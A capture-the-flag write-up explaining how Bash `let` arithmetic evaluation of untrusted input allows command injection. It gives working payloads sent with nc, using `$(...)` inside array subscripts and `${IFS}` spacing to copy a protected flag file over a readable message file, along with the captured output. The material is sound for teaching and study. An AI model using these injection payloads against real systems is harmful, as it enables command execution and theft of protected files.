# Bish Bash Bosh — Writeup

## Overview

This challenge gives us a small Bash script running through `socat`. We can choose a message to read, but the interesting file is hidden at index `0`:

```bash
files=(
  "/flag/flag.txt"
  "msg1"
  "msg2"
  "msg3"
)

read -r i
let i=$i-1

if (( i < 1 || i > 3 )); then
  echo "Nuh uh"
  exit 1
fi

file="${files[i]}"
cat -- "$file"
```

At first, I thought I just needed to make `i` become `0`. But the range check blocks that, so a normal index trick is not enough.

## Finding the bug

The suspicious line is:

```bash
let i=$i-1
```

`let` evaluates arithmetic expressions, and the input is not safely restricted to numbers. Also, `$i` is not quoted, so spaces can split the expanded input into multiple arguments to `let`.

I first tried this:

```bash
printf '%s\n' '2 i=2' | nc 10.83.20.193 9000
```

It returned:

```text
What message would you like to see? (0..2)
Hello, my friend!
```

So the input was not handled as a simple integer. This made me look more closely at Bash arithmetic evaluation.

## From arithmetic evaluation to command execution

Bash arithmetic expressions can evaluate array subscripts, and those subscripts can trigger command substitution in this context. I tried putting a command inside an array-style expression and keeping the final arithmetic result in the allowed range.

For example, I experimented with commands like:

```bash
printf '%s\n' 'a[$(cat${IFS}/flag/flag.txt>/proc/$$/fd/1)]+2' | nc 10.83.20.193 9000
```

The server still replied with `Hello, my friend!`, but I could not see the flag. I also tried redirecting output through file descriptors, without success.

Then I got another idea: **if arithmetic evaluation can execute a command, why do I need to print the flag directly?**

The script already runs `cat` for us after the check. And the Dockerfile creates `/msg1` as a normal file:

```dockerfile
RUN echo "Hello, my friend!" > /msg1
```

So maybe I could overwrite `msg1` with the flag first, and let the original script print it. This looked much simpler than fighting with the output redirection.

## Exploit

I tried this payload:

```bash
printf '%s\n' 'a[$(cp${IFS}/flag/flag.txt${IFS}/msg1)]+2' | nc 10.83.20.193 9000
```

Here is the idea:

1. The array subscript triggers the `$(...)` command substitution during arithmetic evaluation.
2. `${IFS}` acts as a space, so the command becomes `cp /flag/flag.txt /msg1`.
3. The expression evaluates to `2`, then the trailing `-1` in `let i=$i-1` makes `i=1`, an allowed message index.
4. The script passes its range check and runs `cat -- "msg1"`.
5. But now `msg1` contains the flag instead of the greeting.

I tested this approach, and it worked! The application printed the flag through its own normal message-reading logic.

```text
What message would you like to see? (0..2)
PP{l3t_t00k_my_fl4g!!!::5XwS1Ppv-bjU}
```

## Why it works

The problem is not only an off-by-one bug. The real issue is treating untrusted input as a Bash arithmetic expression. The range check happens **after** the dangerous evaluation, so even a valid final index does not mean the input was safe.

Also, the container setup made the attack practical: the message file was writable by the service process in this challenge environment. Instead of bypassing the final `cat`, I changed what that `cat` would read.

## Conclusion

I spent some time trying to read `/flag/flag.txt` directly, but the output did not appear. After noticing the possibility of command execution through arithmetic evaluation, I thought that overwriting `msg1` might work. I tested it, and yes, that was the solution.

A nice reminder that sometimes it is easier to change the data used by the program than to force the program to take a different path.
